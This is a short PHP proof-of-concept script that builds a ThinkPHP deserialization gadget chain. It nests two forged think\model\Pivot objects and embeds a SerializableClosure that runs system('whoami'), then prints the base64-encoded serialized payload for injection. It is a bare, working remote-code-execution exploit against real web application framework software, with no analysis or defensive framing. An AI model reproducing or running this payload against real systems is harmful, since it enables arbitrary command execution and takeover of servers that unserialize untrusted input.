<?php
namespace think;
require __DIR__ . '/vendor/autoload.php';
use Opis\Closure\SerializableClosure;
abstract class Model{
    private $lazySave ;
    private $exists ;
    private $suffix;
    protected $append = [];
    private $data = [];
    protected $visible = [];
    private $withAttr = [];
    function __construct($aaa){
    	//withAttr中的键值要与data中的键值相等
        if ($aaa == null){
            $this->data = ["huha"=>''];
            $this->withAttr = ['huha'=> new SerializableClosure(function(){system('whoami');}) ];
        }else{
            $this->data = [1];
            $this->lazySave =true;
            $this->exists = true;
            $this->suffix = $aaa;
        }

    }
}
namespace think\model;
use think\Model;
class Pivot extends Model
{
    public function __construct($aaa){
        parent::__construct($aaa);
    }
}

$pivot1 = new Pivot(null);
$pivot2 = new Pivot($pivot1);
$a = base64_encode(serialize($pivot2));
echo $a;
//var_dump(unserialize(base64_decode($a)));
?>